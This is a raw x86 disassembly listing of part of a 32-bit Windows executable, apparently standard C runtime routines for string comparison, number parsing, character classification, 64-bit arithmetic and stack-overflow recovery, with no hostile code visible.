  426b92:	mov    DWORD PTR [ebp-0x24],edi
  426b95:	mov    eax,DWORD PTR [ebp+0x14]
  426b98:	mov    ebx,DWORD PTR [eax]
  426b9a:	mov    DWORD PTR [ebp-0x28],ebx
  426b9d:	mov    DWORD PTR [ebp-0x2c],edi
  426ba0:	mov    eax,DWORD PTR [ebp+0x8]
  426ba3:	cmp    eax,DWORD PTR [ebp+0xc]
  426ba6:	je     0x426d1f
  426bac:	lea    ecx,[ebp-0x40]
  426baf:	push   ecx
  426bb0:	push   eax
  426bb1:	mov    esi,DWORD PTR ds:0x4280a4
  426bb7:	call   esi
  426bb9:	test   eax,eax
  426bbb:	je     0x426bdd
  426bbd:	cmp    DWORD PTR [ebp-0x40],0x1
  426bc1:	jne    0x426bdd
  426bc3:	lea    eax,[ebp-0x40]
  426bc6:	push   eax
  426bc7:	push   DWORD PTR [ebp+0xc]
  426bca:	call   esi
  426bcc:	test   eax,eax
  426bce:	je     0x426bdd
  426bd0:	cmp    DWORD PTR [ebp-0x40],0x1
  426bd4:	jne    0x426bdd
  426bd6:	mov    DWORD PTR [ebp-0x2c],0x1
  426bdd:	cmp    DWORD PTR [ebp-0x2c],edi
  426be0:	je     0x426bfc
  426be2:	cmp    ebx,0xffffffff
  426be5:	je     0x426beb
  426be7:	mov    esi,ebx
  426be9:	jmp    0x426bf7
  426beb:	push   DWORD PTR [ebp+0x10]
  426bee:	call   0x423ec0
  426bf3:	pop    ecx
  426bf4:	mov    esi,eax
  426bf6:	inc    esi
  426bf7:	mov    DWORD PTR [ebp-0x44],esi
  426bfa:	jmp    0x426bff
  426bfc:	mov    esi,DWORD PTR [ebp-0x44]
  426bff:	cmp    DWORD PTR [ebp-0x2c],edi
  426c02:	jne    0x426c1e
  426c04:	push   edi
  426c05:	push   edi
  426c06:	push   ebx
  426c07:	push   DWORD PTR [ebp+0x10]
  426c0a:	push   0x1
  426c0c:	push   DWORD PTR [ebp+0x8]
  426c0f:	call   DWORD PTR ds:0x4280d0
  426c15:	mov    esi,eax
  426c17:	mov    DWORD PTR [ebp-0x44],esi
  426c1a:	cmp    esi,edi
  426c1c:	je     0x426c76
  426c1e:	mov    DWORD PTR [ebp-0x4],edi
  426c21:	lea    eax,[esi+esi*1]
  426c24:	add    eax,0x3
  426c27:	and    eax,0xfffffffc
  426c2a:	call   0x423900
  426c2f:	mov    DWORD PTR [ebp-0x18],esp
  426c32:	mov    ebx,esp
  426c34:	mov    DWORD PTR [ebp-0x48],ebx
  426c37:	lea    eax,[esi+esi*1]
  426c3a:	push   eax
  426c3b:	push   edi
  426c3c:	push   ebx
  426c3d:	call   0x4261b0
  426c42:	add    esp,0xc
  426c45:	or     DWORD PTR [ebp-0x4],0xffffffff
  426c49:	jmp    0x426c62
  426c4b:	xor    eax,eax
  426c4d:	inc    eax
  426c4e:	ret    
  426c4f:	mov    esp,DWORD PTR [ebp-0x18]
  426c52:	call   0x426d45
  426c57:	xor    edi,edi
  426c59:	xor    ebx,ebx
  426c5b:	or     DWORD PTR [ebp-0x4],0xffffffff
  426c5f:	mov    esi,DWORD PTR [ebp-0x44]
  426c62:	cmp    ebx,edi
  426c64:	jne    0x426c84
  426c66:	push   esi
  426c67:	push   0x2
  426c69:	call   0x4249c8
  426c6e:	pop    ecx
  426c6f:	pop    ecx
  426c70:	mov    ebx,eax
  426c72:	cmp    ebx,edi
  426c74:	jne    0x426c7d
  426c76:	xor    eax,eax
  426c78:	jmp    0x426d31
  426c7d:	mov    DWORD PTR [ebp-0x24],0x1
  426c84:	push   esi
  426c85:	push   ebx
  426c86:	push   DWORD PTR [ebp-0x28]
  426c89:	push   DWORD PTR [ebp+0x10]
  426c8c:	push   0x1
  426c8e:	push   DWORD PTR [ebp+0x8]
  426c91:	call   DWORD PTR ds:0x4280d0
  426c97:	test   eax,eax
  426c99:	je     0x426d22
  426c9f:	cmp    DWORD PTR [ebp+0x18],edi
  426ca2:	je     0x426cc4
  426ca4:	push   edi
  426ca5:	push   edi
  426ca6:	push   DWORD PTR [ebp+0x1c]
  426ca9:	push   DWORD PTR [ebp+0x18]
  426cac:	push   esi
  426cad:	push   ebx
  426cae:	push   edi
  426caf:	push   DWORD PTR [ebp+0xc]
  426cb2:	call   DWORD PTR ds:0x428054
  426cb8:	test   eax,eax
  426cba:	je     0x426d22
  426cbc:	mov    eax,DWORD PTR [ebp+0x18]
  426cbf:	mov    DWORD PTR [ebp-0x20],eax
  426cc2:	jmp    0x426d22
  426cc4:	cmp    DWORD PTR [ebp-0x2c],edi
  426cc7:	jne    0x426cdf
  426cc9:	push   edi
  426cca:	push   edi
  426ccb:	push   edi
  426ccc:	push   edi
  426ccd:	push   esi
  426cce:	push   ebx
  426ccf:	push   edi
  426cd0:	push   DWORD PTR [ebp+0xc]
  426cd3:	call   DWORD PTR ds:0x428054
  426cd9:	mov    esi,eax
  426cdb:	cmp    esi,edi
  426cdd:	je     0x426d22
  426cdf:	push   esi
  426ce0:	push   0x1
  426ce2:	call   0x4249c8
  426ce7:	pop    ecx
  426ce8:	pop    ecx
  426ce9:	mov    DWORD PTR [ebp-0x20],eax
  426cec:	cmp    eax,edi
  426cee:	je     0x426d22
  426cf0:	push   edi
  426cf1:	push   edi
  426cf2:	push   esi
  426cf3:	push   eax
  426cf4:	push   esi
  426cf5:	push   ebx
  426cf6:	push   edi
  426cf7:	push   DWORD PTR [ebp+0xc]
  426cfa:	call   DWORD PTR ds:0x428054
  426d00:	cmp    eax,edi
  426d02:	jne    0x426d12
  426d04:	push   DWORD PTR [ebp-0x20]
  426d07:	call   0x4244ba
  426d0c:	pop    ecx
  426d0d:	mov    DWORD PTR [ebp-0x20],edi
  426d10:	jmp    0x426d22
  426d12:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  426d16:	je     0x426d22
  426d18:	mov    ecx,DWORD PTR [ebp+0x14]
  426d1b:	mov    DWORD PTR [ecx],eax
  426d1d:	jmp    0x426d22
  426d1f:	mov    ebx,DWORD PTR [ebp-0x48]
  426d22:	cmp    DWORD PTR [ebp-0x24],edi
  426d25:	je     0x426d2e
  426d27:	push   ebx
  426d28:	call   0x4244ba
  426d2d:	pop    ecx
  426d2e:	mov    eax,DWORD PTR [ebp-0x20]
  426d31:	lea    esp,[ebp-0x54]
  426d34:	mov    ecx,DWORD PTR [ebp-0x1c]
  426d37:	xor    ecx,DWORD PTR [ebp+0x4]
  426d3a:	call   0x423f7c
  426d3f:	call   0x4238e3
  426d44:	ret    
  426d45:	push   ebp
  426d46:	mov    ebp,esp
  426d48:	sub    esp,0x48
  426d4b:	push   ebx
  426d4c:	push   esi
  426d4d:	push   edi
  426d4e:	push   0x4
  426d50:	pop    eax
  426d51:	call   0x423900
  426d56:	mov    ebx,esp
  426d58:	push   0x1c
  426d5a:	lea    eax,[ebp-0x24]
  426d5d:	push   eax
  426d5e:	push   ebx
  426d5f:	call   DWORD PTR ds:0x4280f0
  426d65:	test   eax,eax
  426d67:	je     0x426dda
  426d69:	mov    edi,DWORD PTR [ebp-0x20]
  426d6c:	lea    eax,[ebp-0x48]
  426d6f:	push   eax
  426d70:	call   DWORD PTR ds:0x4280ec
  426d76:	mov    eax,DWORD PTR [ebp-0x44]
  426d79:	lea    esi,[eax-0x1]
  426d7c:	not    esi
  426d7e:	and    esi,ebx
  426d80:	sub    esi,eax
  426d82:	mov    DWORD PTR [ebp-0x4],eax
  426d85:	mov    eax,ds:0x45cac4
  426d8a:	mov    ecx,eax
  426d8c:	dec    ecx
  426d8d:	neg    ecx
  426d8f:	sbb    ecx,ecx
  426d91:	and    ecx,0xffff1000
  426d97:	add    ecx,0x11000
  426d9d:	add    ecx,edi
  426d9f:	cmp    esi,ecx
  426da1:	jb     0x426dda
  426da3:	cmp    eax,0x1
  426da6:	je     0x426df2
  426da8:	mov    ebx,edi
  426daa:	mov    edi,0x1000
  426daf:	push   0x1c
  426db1:	lea    eax,[ebp-0x24]
  426db4:	push   eax
  426db5:	push   ebx
  426db6:	call   DWORD PTR ds:0x4280f0
  426dbc:	test   eax,eax
  426dbe:	je     0x426dda
  426dc0:	add    ebx,DWORD PTR [ebp-0x18]
  426dc3:	test   DWORD PTR [ebp-0x14],edi
  426dc6:	je     0x426daf
  426dc8:	test   BYTE PTR [ebp-0xf],0x1
  426dcc:	mov    ebx,DWORD PTR [ebp-0x24]
  426dcf:	je     0x426dd6
  426dd1:	xor    eax,eax
  426dd3:	inc    eax
  426dd4:	jmp    0x426e0e
  426dd6:	cmp    esi,ebx
  426dd8:	jae    0x426dde
  426dda:	xor    eax,eax
  426ddc:	jmp    0x426e0e
  426dde:	push   0x4
  426de0:	push   edi
  426de1:	push   DWORD PTR [ebp-0x4]
  426de4:	push   ebx
  426de5:	call   DWORD PTR ds:0x4280b0
  426deb:	mov    eax,ds:0x45cac4
  426df0:	jmp    0x426df4
  426df2:	mov    ebx,esi
  426df4:	dec    eax
  426df5:	neg    eax
  426df7:	sbb    eax,eax
  426df9:	and    eax,0x103
  426dfe:	lea    ecx,[ebp-0x8]
  426e01:	push   ecx
  426e02:	inc    eax
  426e03:	push   eax
  426e04:	push   DWORD PTR [ebp-0x4]
  426e07:	push   ebx
  426e08:	call   DWORD PTR ds:0x4280e8
  426e0e:	lea    esp,[ebp-0x54]
  426e11:	pop    edi
  426e12:	pop    esi
  426e13:	pop    ebx
  426e14:	leave  
  426e15:	ret    
  426e16:	int3   
  426e17:	int3   
  426e18:	int3   
  426e19:	int3   
  426e1a:	int3   
  426e1b:	int3   
  426e1c:	int3   
  426e1d:	int3   
  426e1e:	int3   
  426e1f:	int3   
  426e20:	push   ebp
  426e21:	mov    ebp,esp
  426e23:	push   edi
  426e24:	push   esi
  426e25:	push   ebx
  426e26:	mov    esi,DWORD PTR [ebp+0xc]
  426e29:	mov    edi,DWORD PTR [ebp+0x8]
  426e2c:	mov    al,0xff
  426e2e:	mov    edi,edi
  426e30:	or     al,al
  426e32:	je     0x426e66
  426e34:	mov    al,BYTE PTR [esi]
  426e36:	add    esi,0x1
  426e39:	mov    ah,BYTE PTR [edi]
  426e3b:	add    edi,0x1
  426e3e:	cmp    ah,al
  426e40:	je     0x426e30
  426e42:	sub    al,0x41
  426e44:	cmp    al,0x1a
  426e46:	sbb    cl,cl
  426e48:	and    cl,0x20
  426e4b:	add    al,cl
  426e4d:	add    al,0x41
  426e4f:	xchg   al,ah
  426e51:	sub    al,0x41
  426e53:	cmp    al,0x1a
  426e55:	sbb    cl,cl
  426e57:	and    cl,0x20
  426e5a:	add    al,cl
  426e5c:	add    al,0x41
  426e5e:	cmp    al,ah
  426e60:	je     0x426e30
  426e62:	sbb    al,al
  426e64:	sbb    al,0xff
  426e66:	movsx  eax,al
  426e69:	pop    ebx
  426e6a:	pop    esi
  426e6b:	pop    edi
  426e6c:	leave  
  426e6d:	ret    
  426e6e:	push   esi
  426e6f:	push   edi
  426e70:	call   0x42375d
  426e75:	mov    edi,DWORD PTR [eax+0x64]
  426e78:	cmp    edi,DWORD PTR ds:0x45c58c
  426e7e:	je     0x426e87
  426e80:	call   0x424c0f
  426e85:	mov    edi,eax
  426e87:	mov    esi,DWORD PTR [esp+0xc]
  426e8b:	cmp    DWORD PTR [edi+0x28],0x1
  426e8f:	movzx  eax,BYTE PTR [esi]
  426e92:	jle    0x426ea2
  426e94:	push   0x8
  426e96:	push   eax
  426e97:	push   edi
  426e98:	call   0x426ef6
  426e9d:	add    esp,0xc
  426ea0:	jmp    0x426eac
  426ea2:	mov    ecx,DWORD PTR [edi+0x48]
  426ea5:	movzx  eax,BYTE PTR [ecx+eax*2]
  426ea9:	and    eax,0x8
  426eac:	test   eax,eax
  426eae:	je     0x426eb3
  426eb0:	inc    esi
  426eb1:	jmp    0x426e8b
  426eb3:	movzx  ecx,BYTE PTR [esi]
  426eb6:	inc    esi
  426eb7:	cmp    ecx,0x2d
  426eba:	mov    edx,ecx
  426ebc:	je     0x426ec3
  426ebe:	cmp    ecx,0x2b
  426ec1:	jne    0x426ec7
  426ec3:	movzx  ecx,BYTE PTR [esi]
  426ec6:	inc    esi
  426ec7:	xor    eax,eax
  426ec9:	cmp    ecx,0x30
  426ecc:	jl     0x426ed8
  426ece:	cmp    ecx,0x39
  426ed1:	jg     0x426ed8
  426ed3:	sub    ecx,0x30
  426ed6:	jmp    0x426edb
  426ed8:	or     ecx,0xffffffff
  426edb:	cmp    ecx,0xffffffff
  426ede:	je     0x426eec
  426ee0:	lea    eax,[eax+eax*4]
  426ee3:	lea    eax,[ecx+eax*2]
  426ee6:	movzx  ecx,BYTE PTR [esi]
  426ee9:	inc    esi
  426eea:	jmp    0x426ec9
  426eec:	cmp    edx,0x2d
  426eef:	pop    edi
  426ef0:	pop    esi
  426ef1:	jne    0x426ef5
  426ef3:	neg    eax
  426ef5:	ret    
  426ef6:	push   ebp
  426ef7:	mov    ebp,esp
  426ef9:	push   ecx
  426efa:	mov    eax,DWORD PTR [ebp+0xc]
  426efd:	lea    ecx,[eax+0x1]
  426f00:	cmp    ecx,0x100
  426f06:	mov    ecx,DWORD PTR [ebp+0x8]
  426f09:	ja     0x426f14
  426f0b:	mov    ecx,DWORD PTR [ecx+0x48]
  426f0e:	movzx  eax,WORD PTR [ecx+eax*2]
  426f12:	jmp    0x426f68
  426f14:	push   esi
  426f15:	mov    edx,eax
  426f17:	sar    edx,0x8
  426f1a:	push   edi
  426f1b:	mov    edi,DWORD PTR [ecx+0x48]
  426f1e:	movzx  esi,dl
  426f21:	test   BYTE PTR [edi+esi*2+0x1],0x80
  426f26:	pop    edi
  426f27:	pop    esi
  426f28:	je     0x426f39
  426f2a:	and    BYTE PTR [ebp-0x2],0x0
  426f2e:	push   0x2
  426f30:	mov    BYTE PTR [ebp-0x3],al
  426f33:	mov    BYTE PTR [ebp-0x4],dl
  426f36:	pop    eax
  426f37:	jmp    0x426f43
  426f39:	and    BYTE PTR [ebp-0x3],0x0
  426f3d:	mov    BYTE PTR [ebp-0x4],al
  426f40:	xor    eax,eax
  426f42:	inc    eax
  426f43:	push   0x1
  426f45:	push   DWORD PTR [ecx+0x14]
  426f48:	push   DWORD PTR [ecx+0x4]
  426f4b:	lea    ecx,[ebp+0xe]
  426f4e:	push   ecx
  426f4f:	push   eax
  426f50:	lea    eax,[ebp-0x4]
  426f53:	push   eax
  426f54:	push   0x1
  426f56:	call   0x425fd8
  426f5b:	add    esp,0x1c
  426f5e:	test   eax,eax
  426f60:	jne    0x426f64
  426f62:	leave  
  426f63:	ret    
  426f64:	movzx  eax,WORD PTR [ebp+0xe]
  426f68:	and    eax,DWORD PTR [ebp+0x10]
  426f6b:	leave  
  426f6c:	ret    
  426f6d:	int3   
  426f6e:	int3   
  426f6f:	int3   
  426f70:	mov    eax,DWORD PTR [esp+0x8]
  426f74:	mov    ecx,DWORD PTR [esp+0x10]
  426f78:	or     ecx,eax
  426f7a:	mov    ecx,DWORD PTR [esp+0xc]
  426f7e:	jne    0x426f89
  426f80:	mov    eax,DWORD PTR [esp+0x4]
  426f84:	mul    ecx
  426f86:	ret    0x10
  426f89:	push   ebx
  426f8a:	mul    ecx
  426f8c:	mov    ebx,eax
  426f8e:	mov    eax,DWORD PTR [esp+0x8]
  426f92:	mul    DWORD PTR [esp+0x14]
  426f96:	add    ebx,eax
  426f98:	mov    eax,DWORD PTR [esp+0x8]
  426f9c:	mul    ecx
  426f9e:	add    edx,ebx
  426fa0:	pop    ebx
  426fa1:	ret    0x10
  426fa4:	int3   
  426fa5:	int3   
  426fa6:	int3   
  426fa7:	int3   
  426fa8:	int3   
  426fa9:	int3   
  426faa:	int3   
  426fab:	int3   
  426fac:	int3   
  426fad:	int3   
  426fae:	int3   
  426faf:	int3   
  426fb0:	push   ebp
  426fb1:	mov    ebp,esp
  426fb3:	push   edi
  426fb4:	push   esi
  426fb5:	push   ebx
  426fb6:	mov    ecx,DWORD PTR [ebp+0x10]
  426fb9:	or     ecx,ecx
  426fbb:	je     0x42700a
  426fbd:	mov    esi,DWORD PTR [ebp+0x8]
  426fc0:	mov    edi,DWORD PTR [ebp+0xc]
  426fc3:	mov    bh,0x41
  426fc5:	mov    bl,0x5a
  426fc7:	mov    dh,0x20
  426fc9:	lea    ecx,[ecx+0x0]
  426fcc:	mov    ah,BYTE PTR [esi]
  426fce:	or     ah,ah
  426fd0:	mov    al,BYTE PTR [edi]
  426fd2:	je     0x426ffb
  426fd4:	or     al,al
  426fd6:	je     0x426ffb
  426fd8:	add    esi,0x1
  426fdb:	add    edi,0x1
  426fde:	cmp    ah,bh
  426fe0:	jb     0x426fe8
  426fe2:	cmp    ah,bl
  426fe4:	ja     0x426fe8
  426fe6:	add    ah,dh
  426fe8:	cmp    al,bh
  426fea:	jb     0x426ff2
  426fec:	cmp    al,bl
  426fee:	ja     0x426ff2
  426ff0:	add    al,dh
  426ff2:	cmp    ah,al
  426ff4:	jne    0x427001
  426ff6:	sub    ecx,0x1
  426ff9:	jne    0x426fcc
  426ffb:	xor    ecx,ecx
  426ffd:	cmp    ah,al
  426fff:	je     0x42700a
  427001:	mov    ecx,0xffffffff
  427006:	jb     0x42700a
  427008:	neg    ecx
  42700a:	mov    eax,ecx
  42700c:	pop    ebx
  42700d:	pop    esi
  42700e:	pop    edi
  42700f:	leave  
  427010:	ret    
  427011:	int3   
  427012:	int3   
  427013:	int3   
  427014:	int3   
  427015:	int3   
  427016:	int3   
  427017:	int3   
  427018:	int3   
  427019:	int3   
  42701a:	int3   
  42701b:	int3   
  42701c:	int3   
  42701d:	int3   
  42701e:	int3   
  42701f:	int3   
  427020:	push   esi
  427021:	mov    eax,DWORD PTR [esp+0x14]
  427025:	or     eax,eax
  427027:	jne    0x427051
  427029:	mov    ecx,DWORD PTR [esp+0x10]
  42702d:	mov    eax,DWORD PTR [esp+0xc]
  427031:	xor    edx,edx
  427033:	div    ecx
  427035:	mov    ebx,eax
  427037:	mov    eax,DWORD PTR [esp+0x8]
  42703b:	div    ecx
  42703d:	mov    esi,eax
  42703f:	mov    eax,ebx
  427041:	mul    DWORD PTR [esp+0x10]
  427045:	mov    ecx,eax
  427047:	mov    eax,esi
  427049:	mul    DWORD PTR [esp+0x10]
  42704d:	add    edx,ecx
  42704f:	jmp    0x427098
  427051:	mov    ecx,eax
  427053:	mov    ebx,DWORD PTR [esp+0x10]
  427057:	mov    edx,DWORD PTR [esp+0xc]
  42705b:	mov    eax,DWORD PTR [esp+0x8]
  42705f:	shr    ecx,1
  427061:	rcr    ebx,1
  427063:	shr    edx,1
  427065:	rcr    eax,1
  427067:	or     ecx,ecx
  427069:	jne    0x42705f
  42706b:	div    ebx
  42706d:	mov    esi,eax
  42706f:	mul    DWORD PTR [esp+0x14]
  427073:	mov    ecx,eax
  427075:	mov    eax,DWORD PTR [esp+0x10]
  427079:	mul    esi
  42707b:	add    edx,ecx
  42707d:	jb     0x42708d
  42707f:	cmp    edx,DWORD PTR [esp+0xc]
  427083:	ja     0x42708d
  427085:	jb     0x427096
  427087:	cmp    eax,DWORD PTR [esp+0x8]
  42708b:	jbe    0x427096
  42708d:	dec    esi
  42708e:	sub    eax,DWORD PTR [esp+0x10]
  427092:	sbb    edx,DWORD PTR [esp+0x14]
  427096:	xor    ebx,ebx
  427098:	sub    eax,DWORD PTR [esp+0x8]
  42709c:	sbb    edx,DWORD PTR [esp+0xc]
  4270a0:	neg    edx
  4270a2:	neg    eax
  4270a4:	sbb    edx,0x0
  4270a7:	mov    ecx,edx
  4270a9:	mov    edx,ebx
  4270ab:	mov    ebx,ecx
  4270ad:	mov    ecx,eax
  4270af:	mov    eax,esi
  4270b1:	pop    esi
  4270b2:	ret    0x10
  4270b5:	int3   
  4270b6:	int3   
  4270b7:	int3   
  4270b8:	int3   
  4270b9:	int3   
  4270ba:	int3   
  4270bb:	int3   
  4270bc:	int3   
  4270bd:	int3   
  4270be:	int3   
  4270bf:	int3   
  4270c0:	lea    eax,[edx-0x1]
  4270c3:	pop    ebx
  4270c4:	ret    
  4270c5:	lea    esp,[esp+0x0]
  4270cc:	lea    esp,[esp+0x0]
  4270d0:	xor    eax,eax
  4270d2:	mov    al,BYTE PTR [esp+0x8]
  4270d6:	push   ebx
  4270d7:	mov    ebx,eax
  4270d9:	shl    eax,0x8
  4270dc:	mov    edx,DWORD PTR [esp+0x8]
  4270e0:	test   edx,0x3
  4270e6:	je     0x4270fd
  4270e8:	mov    cl,BYTE PTR [edx]
  4270ea:	add    edx,0x1
  4270ed:	cmp    cl,bl
  4270ef:	je     0x4270c0
  4270f1:	test   cl,cl
  4270f3:	je     0x427146
  4270f5:	test   edx,0x3
  4270fb:	jne    0x4270e8
  4270fd:	or     ebx,eax
  4270ff:	push   edi
  427100:	mov    eax,ebx
  427102:	shl    ebx,0x10
  427105:	push   esi
  427106:	or     ebx,eax
  427108:	mov    ecx,DWORD PTR [edx]
  42710a:	mov    edi,0x7efefeff
  42710f:	mov    eax,ecx
  427111:	mov    esi,edi
  427113:	xor    ecx,ebx
  427115:	add    esi,eax
  427117:	add    edi,ecx
  427119:	xor    ecx,0xffffffff
  42711c:	xor    eax,0xffffffff
  42711f:	xor    ecx,edi
  427121:	xor    eax,esi
  427123:	add    edx,0x4
  427126:	and    ecx,0x81010100
  42712c:	jne    0x42714a
  42712e:	and    eax,0x81010100
  427133:	je     0x427108
  427135:	and    eax,0x1010100
  42713a:	jne    0x427144
  42713c:	and    esi,0x80000000
  427142:	jne    0x427108
  427144:	pop    esi
  427145:	pop    edi
  427146:	pop    ebx
  427147:	xor    eax,eax
  427149:	ret    
  42714a:	mov    eax,DWORD PTR [edx-0x4]
  42714d:	cmp    al,bl
  42714f:	je     0x427187
  427151:	test   al,al
  427153:	je     0x427144
  427155:	cmp    ah,bl
  427157:	je     0x427180
  427159:	test   ah,ah
  42715b:	je     0x427144
  42715d:	shr    eax,0x10
  427160:	cmp    al,bl
  427162:	je     0x427179
  427164:	test   al,al
  427166:	je     0x427144
  427168:	cmp    ah,bl
  42716a:	je     0x427172
  42716c:	test   ah,ah
  42716e:	je     0x427144
  427170:	jmp    0x427108
  427172:	pop    esi
  427173:	pop    edi
  427174:	lea    eax,[edx-0x1]
  427177:	pop    ebx
  427178:	ret    
  427179:	lea    eax,[edx-0x2]
  42717c:	pop    esi
  42717d:	pop    edi
  42717e:	pop    ebx
  42717f:	ret    
  427180:	lea    eax,[edx-0x3]
  427183:	pop    esi
  427184:	pop    edi
  427185:	pop    ebx
  427186:	ret    
  427187:	lea    eax,[edx-0x4]
  42718a:	pop    esi
  42718b:	pop    edi
  42718c:	pop    ebx
  42718d:	ret    
  42718e:	jmp    DWORD PTR ds:0x4280e4
